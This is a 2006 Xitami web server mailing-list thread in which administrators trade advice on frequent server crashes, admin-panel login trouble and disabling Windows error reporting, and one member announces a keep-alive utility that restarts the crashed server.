+Date: Sat Feb 25 22:53:30 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2 (and some	CGI
+	hints)
+In-Reply-To: <6.2.5.6.0.20060225192056.01bd77f8@mrjdesign.net>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>	<1140677801.27a8a11ee6836@mail.bg>	<6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>	<006801c63856$d3623750$d50110ac@test123>	<6.2.5.6.0.20060223090012.01c35df0@mrjdesign.net>	<007a01c63983$cd4d6be0$d50110ac@test123>
+	<6.2.5.6.0.20060225192056.01bd77f8@mrjdesign.net>
+Message-ID: <4400D1C5.2040008@2cah.com>
+
+MRJ InfoTech Admin wrote:
+> 
+> Thank you for explaining the 4 and 5...
+> 
+> I've used Xitami since I first started doing basic HTML code on my own 
+> just to have something to test it with,
+> instead of the old angelfire web sites as where massively popular back 
+> in 1995.
+> 
+> I think I am coming to a couple of conclusions in this Xitami bug issue, 
+> and they may be wrong,
+> until I get more into the source of the applications themselves, but 
+> here goes nothing.
+
+First things first, stop calling every issue you have with Xitami 
+"urgent". Every topic you have started cries wolf that way. Its not only 
+annoying, its a good way to get ignored.
+
+Since you seem to be having so many issues with the 2.5 series, how 
+about trying an older version? That will give a baseline on where the 
+'issues' you are having started.
+
+ From a developers point of view its always nice to know when things 
+start breaking.
+
+I've run the 2.4dxx series for over 5 years now with -zero- issues at 
+all for 13+ domains running all manner of CGI. Its been rock stable. 
+Back up a bit and give us something to work with, it might pay off for you.
+
+-- 
+Craig Morrison
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+http://pse.2cah.com
+   Controlling pseudoephedrine purchases.
+
+http://www.mtsprofessional.com/
+   A Win32 email server that works for You.
+
+From admin at mrjdesign.net  Sun Feb 26 08:15:10 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sun Feb 26 08:15:12 2006
+Subject: [Xitami] Re: server crashes Xitami 2.5c2 (and some	CGI
+  hints)
+In-Reply-To: <4400D1C5.2040008@2cah.com>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+	<1140677801.27a8a11ee6836@mail.bg>
+	<6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>
+	<006801c63856$d3623750$d50110ac@test123>
+	<6.2.5.6.0.20060223090012.01c35df0@mrjdesign.net>
+	<007a01c63983$cd4d6be0$d50110ac@test123>
+	<6.2.5.6.0.20060225192056.01bd77f8@mrjdesign.net>
+	<4400D1C5.2040008@2cah.com>
+Message-ID: <6.2.5.6.0.20060226070700.01c06e60@mrjdesign.net>
+
+
+
+
+>First things first, stop calling every issue you have with Xitami 
+>"urgent". Every topic you have started cries wolf that way. Its not 
+>only annoying, its a good way to get ignored.
+
+I have called two posted messages urgent, and both are referring to 
+these crashes that suddenly became ever more frequent.
+Having a site up (or 16 of them) and the server suddenly goes off 
+line as soon you don't watch it, seems urgent to me, and more so to my clients.
+
+However the many replies in this thread makes the topic stand out 
+perhaps. I'll give you that.
+If many replies and forwards of a certain thread is reason to ignore 
+it, then that would be up to you.
+
+As I said before, and as Peter also knows, I will likely send for a 
+friend from Denmark after this semester is over and get to work on 
+the source of Xitami.
+As such, I'll be around in a whole different way, and hardly anything 
+would seem urgent after that.
+
+I also removed the Urgent word from the reply to this message, as it 
+might please you a bit better too.
+I will also of course follow your advise and pull a copy of the 2.4 
+version to see if it will make a difference in this. It would be stupid not to.
+
+Thank you for your advise.
+
+- Mike 
+
+
+
+
+From admin at mrjdesign.net  Sun Feb 26 08:19:58 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sun Feb 26 08:20:00 2006
+Subject: [Xitami] Cannot Access Administration panel
+In-Reply-To: <ec672f1d0512290957m77f3d07fvffcc95c540d19f77@mail.gmail.co
+ m>
+References: <ec672f1d0512290957m77f3d07fvffcc95c540d19f77@mail.gmail.com>
+Message-ID: <6.2.5.6.0.20060226071618.01c06728@mrjdesign.net>
+
+Try setting your xitami.aut and the ftpdirs.aut as well as 
+ftpusers.aut to reflect the same usage and passwords if you have the 
+section [ftp] enabled.
+That I recall fixed it for me when I tried to log in using the web 
+access panels. (for some odd reason)
+
+But that was a while ago since I stopped using the web access since I 
+find editing the aut files is easier by hand.
+
+
+
+ >Xitami.aut so my username and password in the administration panel 
+are different, and when Firefox or Seamonkey says Enter your password 
+for /admin at 127.0.01, the >correct username and password doesn't 
+work.  I have reinstalled, reset and reconfigured my firewall and 
+TCP/IP Networking.  Any help would be well apreciated.
+>-
+
+
+
+
+From admin at mrjdesign.net  Sun Feb 26 13:28:27 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sun Feb 26 13:28:29 2006
+Subject: [Xitami] Further hints to resolving Xitami crashes
+In-Reply-To: <6.2.5.6.0.20060226070700.01c06e60@mrjdesign.net>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+	<1140677801.27a8a11ee6836@mail.bg>
+	<6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>
+	<006801c63856$d3623750$d50110ac@test123>
+	<6.2.5.6.0.20060223090012.01c35df0@mrjdesign.net>
+	<007a01c63983$cd4d6be0$d50110ac@test123>
+	<6.2.5.6.0.20060225192056.01bd77f8@mrjdesign.net>
+	<4400D1C5.2040008@2cah.com>
+	<6.2.5.6.0.20060226070700.01c06e60@mrjdesign.net>
+Message-ID: <6.2.5.6.0.20060226122235.01bed4a8@mrjdesign.net>
+
+Further hints on avoiding some error settings.
+
+I installed and tried the 2.4 version again as was suggested here, 
+and I came to the conclusion pretty quickly there are several 
+differences between the 2.4 and 2.5
+Something that will need further review before I decide to swipe my 
+installation on  live server and move all my users around.
+
+So, I reinstalled 2.5 and it took no more than 2 hours before the 
+first crash showed up in it's default installation with FTP turned 
+off and access logging on.
+
+Now I found an interesting article which could be further helpful in this.
+
+I included a snippet about this below for those interested.
+
+Also see the article on http://articles.networktechs.com/91-p1.php 
+for details on how to turn off error reporting.
+
+I have already done this since earlier but so far left critical 
+errors as flagged / checked. NOw I am trying without this check mark 
+to see if the dwwin.exe might be a culprit as well.
+
+To some individuals further annoyance, I will post one more message 
+in this series of topics on the Xitami crashes, and that is as soon I 
+have had time to create the tool/utility I am now working on called 
+xitamiKeepAlive. Release of this should be later today, Sunday, but 
+I'll reserve myself against any bugs coming up along the way.
+
+
+dwwin.exe Application Error
+
+One of the biggest things being searched for on this site right now 
+is dwwin.exe. The reason for this is because it displays during quite 
+a few common fatal error messages.
+
+First of all dwwin.exe is Dr Watson which is used by the error 
+reporting tool. Alot of security related applications will throw up 
+warning flags about this file trying to read, write or modify a 
+number of other .exe files. This isn't anything to worry about 
+because it's only trying to investigate "events" that it believes is 
+causing problems that may lead to crashing.
+
+File can be found:
+*:windowssystem32dwwin.exe
+
+The biggest complaint about the error reporting service is it causing 
+alot of various applications to not load or crash during use. Quite a 
+few of these can be fixed by downloading updates from windows update 
+and scanning for viruses/spyware but alot of others simply won't be 
+fixed with the currently available updates. In that case you'll want 
+to just disable the service! After that 90% of the time the program 
+will then run properly. I have been telling people to disable this 
+service in quite a few of my guides.
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060226/ec08be06/attachment.html
+From ronackgen01 at bellsouth.net  Sun Feb 26 14:56:35 2006
+From: ronackgen01 at bellsouth.net (Ron Ackerman)
+Date: Sun Feb 26 14:51:00 2006
+Subject: [Xitami] Re: server crashes Xitami 2.5c2 (and some	CGI  hints)
+In-Reply-To: <6.2.5.6.0.20060226070700.01c06e60@mrjdesign.net>
+Message-ID: <20060226135049.LLYX2237.ibm69aec.bellsouth.net@ronscomputer>
+
+Actually I had more issues with the 2.4 version than the 2.5 so I expect
+that what ever was the problem was not addressed in the updated version. And
+like Mike, this IS an urgent matter. I too only 12 sites and this tends to
+happen at the most inopportune time when I can't get back to the server for
+hours or days. But I've just gone almost a week with no problems. 
+
+Ron
+
+-----Original Message-----
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Sunday, February 26, 2006 2:15 AM
+To: Xitami Users General Discussion
+Subject: Re: [Xitami] Re: server crashes Xitami 2.5c2 (and some CGI hints)
+
+
+
+
+>First things first, stop calling every issue you have with Xitami 
+>"urgent". Every topic you have started cries wolf that way. Its not 
+>only annoying, its a good way to get ignored.
+
+I have called two posted messages urgent, and both are referring to these
+crashes that suddenly became ever more frequent.
+Having a site up (or 16 of them) and the server suddenly goes off line as
+soon you don't watch it, seems urgent to me, and more so to my clients.
+
+However the many replies in this thread makes the topic stand out perhaps.
+I'll give you that.
+If many replies and forwards of a certain thread is reason to ignore it,
+then that would be up to you.
+
+As I said before, and as Peter also knows, I will likely send for a friend
+from Denmark after this semester is over and get to work on the source of
+Xitami.
+As such, I'll be around in a whole different way, and hardly anything would
+seem urgent after that.
+
+I also removed the Urgent word from the reply to this message, as it might
+please you a bit better too.
+I will also of course follow your advise and pull a copy of the 2.4 version
+to see if it will make a difference in this. It would be stupid not to.
+
+Thank you for your advise.
+
+- Mike 
+
+
+
+
+
+--
+Xitami Users Mailing List -- For Xitami support To unsubscribe:
+http://lists.xitami.org/mailman/listinfo/xitami
+
+--
+No virus found in this incoming message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.1.0/269 - Release Date: 2/24/2006
+ 
+
+-- 
+No virus found in this outgoing message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.1.0/269 - Release Date: 2/24/2006
+ 
+
+From admin at mrjdesign.net  Tue Feb 28 06:32:24 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Tue Feb 28 06:32:31 2006
+Subject: [Xitami] Tool to help avoid permanent crashes in xitami 2.5 now
+ available for testing.
+Message-ID: <6.2.5.6.0.20060228052141.01bdad70@mrjdesign.net>
+
+
+OK. so I promised to release a little gadget that 
+might help with the problem of
+crashes being permanent and instead restore your Xitami process properly and
+instantly, almost. This depends on the settings you chose in the application.
+
+It is called xitamiKeepAlive (xiKA for short) and I uploaded it to my web site.
+
+You can download it now and try it, but please know, I have only been able to
+test it briefly on Windows XP since I have no 98, 95 or 200 machines here.
+Also I don't use ME so I will not support that O/S
+
+The zip file contains three files, xitamiKeepAlive.exe, xiKA.exe and the PDF
+file with help and hints, FAQ and a lot more. Also a read-me file is included
+pointing out the section H on page 9 in the PDF file as a vital read.
+
+xitamiKeepAlive.exe is the GUI file to set it up 
+and xiKA.exe is for the hidden sleeper processing.
+
+It uses approx. 3.2 Mb RAM and 0.0% CPU while waiting to act.
+
+The application will also allow you to specify regular reboot periods
+for your server PC if you want to reset the machine completely.
+
+If you guys want to send me feedback or test results, and perhaps let
+me know if it works on your machine, the instructions for this are
+included as well in the PDF file.
+
+Please note! This application will only work on Windows and you must have
+Visual Basic Runtime 6 SP 3 or higher installed.
+
+And it is ONLY for Xitami 2.5c which has the xigui32.exe file.
+
+My URL is http://www.mrjdesign.net/ and click the XITAMI link in the top menu.
+
+If it doesn't work, it doesn't. But at least we will know, wont we :)
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060228/b56c6293/attachment.htm
+From ronackgen01 at bellsouth.net  Tue Feb 28 23:41:17 2006
+From: ronackgen01 at bellsouth.net (Ron Ackerman)
+Date: Tue Feb 28 23:36:25 2006
+Subject: [Xitami] Tool to help avoid permanent crashes in xitami 2.5 now
+	available for testing.
+In-Reply-To: <6.2.5.6.0.20060228052141.01bdad70@mrjdesign.net>
+Message-ID: <20060228223615.YGAQ2237.ibm69aec.bellsouth.net@ronscomputer>
+
+Nice site
+
+   _____  
+
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Tuesday, February 28, 2006 12:32 AM
+To: xitami@lists.xitami.org
+Subject: [Xitami] Tool to help avoid permanent crashes in xitami 2.5 now
+available for testing.
+
+
+
+OK. so I promised to release a little gadget that might help with the
+problem of 
+crashes being permanent and instead restore your Xitami process properly and
+instantly, almost. This depends on the settings you chose in the
+application.
+
+It is called xitamiKeepAlive (xiKA for short) and I uploaded it to my web
+site.
+
+You can download it now and try it, but please know, I have only been able
+to 
+test it briefly on Windows XP since I have no 98, 95 or 200 machines here.
+Also I don't use ME so I will not support that O/S
+
+The zip file contains three files, xitamiKeepAlive.exe, xiKA.exe and the PDF
+
+file with help and hints, FAQ and a lot more. Also a read-me file is
+included 
+pointing out the section H on page 9 in the PDF file as a vital read.
+
+xitamiKeepAlive.exe is the GUI file to set it up and xiKA.exe is for the
+hidden sleeper processing.
+
+It uses approx. 3.2 Mb RAM and 0.0% CPU while waiting to act.
+
+The application will also allow you to specify regular reboot periods 
+for your server PC if you want to reset the machine completely.
+
+If you guys want to send me feedback or test results, and perhaps let 
+me know if it works on your machine, the instructions for this are 
+included as well in the PDF file.
+
+Please note! This application will only work on Windows and you must have
+Visual Basic Runtime 6 SP 3 or higher installed.
+
+And it is ONLY for Xitami 2.5c which has the xigui32.exe file.
+
+My URL is HYPERLINK "http://www.mrjdesign.net/"http://www.mrjdesign.net/ and
+click the XITAMI link in the top menu.
+
+If it doesn't work, it doesn't. But at least we will know, wont we :)
+
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    HYPERLINK
+"http://www.mrjdesign.net/"http://www.mrjdesign.net 
+
+
+
+
+--
+No virus found in this incoming message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.1.1/270 - Release Date: 2/27/2006
+
+
+
+-- 
+No virus found in this outgoing message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.1.1/270 - Release Date: 2/27/2006
+ 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060228/5450f5e0/attachment.html
+From ronackgen01 at bellsouth.net  Tue Feb 28 23:51:06 2006
+From: ronackgen01 at bellsouth.net (Ron Ackerman)
+Date: Tue Feb 28 23:46:05 2006
+Subject: [Xitami] Tool to help avoid permanent crashes in xitami 2.5 now
+	available for testing.
+In-Reply-To: <6.2.5.6.0.20060228052141.01bdad70@mrjdesign.net>
+Message-ID: <20060228224601.YIYB2237.ibm69aec.bellsouth.net@ronscomputer>
+
+Oh by the way, the PDF will not open. Something about it not being supported
+or corrupt.
+
+   _____  
+
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Tuesday, February 28, 2006 12:32 AM
+To: xitami@lists.xitami.org
+Subject: [Xitami] Tool to help avoid permanent crashes in xitami 2.5 now
+available for testing.
+
+
+
+OK. so I promised to release a little gadget that might help with the
+problem of 
+crashes being permanent and instead restore your Xitami process properly and
+instantly, almost. This depends on the settings you chose in the
+application.
+
+It is called xitamiKeepAlive (xiKA for short) and I uploaded it to my web
+site.
+
+You can download it now and try it, but please know, I have only been able
+to 
+test it briefly on Windows XP since I have no 98, 95 or 200 machines here.
+Also I don't use ME so I will not support that O/S
+
+The zip file contains three files, xitamiKeepAlive.exe, xiKA.exe and the PDF
+
+file with help and hints, FAQ and a lot more. Also a read-me file is
+included 
+pointing out the section H on page 9 in the PDF file as a vital read.
+
+xitamiKeepAlive.exe is the GUI file to set it up and xiKA.exe is for the
+hidden sleeper processing.
+
+It uses approx. 3.2 Mb RAM and 0.0% CPU while waiting to act.
+
+The application will also allow you to specify regular reboot periods 
+for your server PC if you want to reset the machine completely.
+
+If you guys want to send me feedback or test results, and perhaps let 
+me know if it works on your machine, the instructions for this are 
+included as well in the PDF file.
+
+Please note! This application will only work on Windows and you must have
+Visual Basic Runtime 6 SP 3 or higher installed.
+
+And it is ONLY for Xitami 2.5c which has the xigui32.exe file.
+
+My URL is HYPERLINK "http://www.mrjdesign.net/"http://www.mrjdesign.net/ and
+click the XITAMI link in the top menu.
+
+If it doesn't work, it doesn't. But at least we will know, wont we :)
+
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    HYPERLINK
+"http://www.mrjdesign.net/"http://www.mrjdesign.net 
+
+
+
+
+--
+No virus found in this incoming message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.1.1/270 - Release Date: 2/27/2006
+
+
+
+-- 
+No virus found in this outgoing message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.1.1/270 - Release Date: 2/27/2006
+ 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060228/211e148b/attachment.htm
